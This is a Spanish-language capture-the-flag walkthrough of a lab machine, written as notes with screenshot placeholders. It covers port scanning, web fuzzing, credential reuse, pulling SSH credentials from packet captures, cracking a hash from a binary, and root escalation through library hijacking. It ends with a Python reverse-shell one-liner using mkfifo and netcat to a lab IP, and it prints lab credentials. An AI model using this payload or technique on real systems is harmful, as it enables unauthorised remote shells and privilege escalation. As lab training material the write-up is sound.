Realizamos un escaneo de nmap y encontramos los siguientes puertos abiertos
![[Pasted image 20240628073007.png]]

Probamos a acceder por ftp pero sin exito
![[Pasted image 20240628073059.png]]

Accedemos a la web y nos encontramos con
![[Pasted image 20240628073212.png]]

Hacemos fuzzing y encontramos los siguientes directorios
![[Pasted image 20240628073637.png]]

Revisamos los directorios y encontramos varios archivos que podrian contener información
![[Pasted image 20240628073837.png]]

Encontramos un directorio con imagenes
![[Pasted image 20240628073904.png]]

Ahora haremos fuzzing web de extensiones de archivos
![[Pasted image 20240628074443.png]]

Si vamos a la carpeta de static nos aparece vacia pero como vemos todos los numeros son la ruta de los directorios donde se almacena cada foto, revisando encontramos que el directorio 00 no es de ninguna imagen, accedemos a el y nos encontramos con este comentario
![[Pasted image 20240628074601.png]]

Revisando el contenido encontramos un directorio, al acceder nos encontramos con un portal de login
![[Pasted image 20240628080313.png]]

Revisamos el código del panel y encontramos un usuario y contraseña
![[Pasted image 20240628082406.png]]

Al probar a acceder nos redirecciona a la siguiente nota
![[Pasted image 20240628082451.png]]

El mensaje nos indica que posiblemente se esten reutilizando credenciales, lo comprobamos y obtenemos acceso por ftp
![[Pasted image 20240628082744.png]]

Encontramos los siguientes archivos con la extension `pcapng` para la caputura de trafico
![[Pasted image 20240628082914.png]]

Los descargamos
![[Pasted image 20240628085806.png]]

Revisando los registros encontramos unas credenciales
```
valleyDev
ph0t0s1234
```
![[Pasted image 20240628091309.png]]

Probamos a acceder por ssh y obtenemos acceso
![[Pasted image 20240628091701.png]]

Revisando los procesos encontramos una tarea que se ejecuta de forma automatica
![[Pasted image 20240628092238.png]]

Revisamos y no tenemos permisos para modificar el fichero
![[Pasted image 20240628092410.png]]

Encontramos que hay binario el cual el un ejecutable para validar usuarios, al probarlo nos solicita las credenciales
![[Pasted image 20240628094241.png]]

Lo descargamos para analizarlo
![[Pasted image 20240628094705.png]]


Y lo transformamos en una cadena legible
```
strings valleyAutenticator > str.txt
```
![[Pasted image 20240628094417.png]]

Revisamos el fichero y encontramos un login, al analizarlo encontramos unos hashes justo antes del mensaje de bienvenida
![[Pasted image 20240628095429.png]]

Lo crackeamos y obenemos una password
![[Pasted image 20240628095502.png]]

Probamos las credenciales con el usuario Valley y ya habremos escalado privilegios con este usuario
![[Pasted image 20240628095835.png]]

Hemos escalado a Valley pero todavia no podemos modificar el fichero `photosEncrypt.py`, revisamos todo el codigo y encontramos que importa una libreria
![[Pasted image 20240628103011.png]]

Tenemos permisos para eliminar la libreria y crear una para generarnos la reverse shell
![[Pasted image 20240628103101.png]]

Modificamos el fichero y añadimos la siguiente linea
![[Pasted image 20240628105605.png]]

Y ahora nos ponemos en escucha con netcat y solo quedara esperar que se ejecuta la tarea
```
import os
os.system('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.155 4242 >/tmp/f')
```
![[Pasted image 20240628110526.png]]

Y ya tendremos acceso como root
![[Pasted image 20240628110751.png]]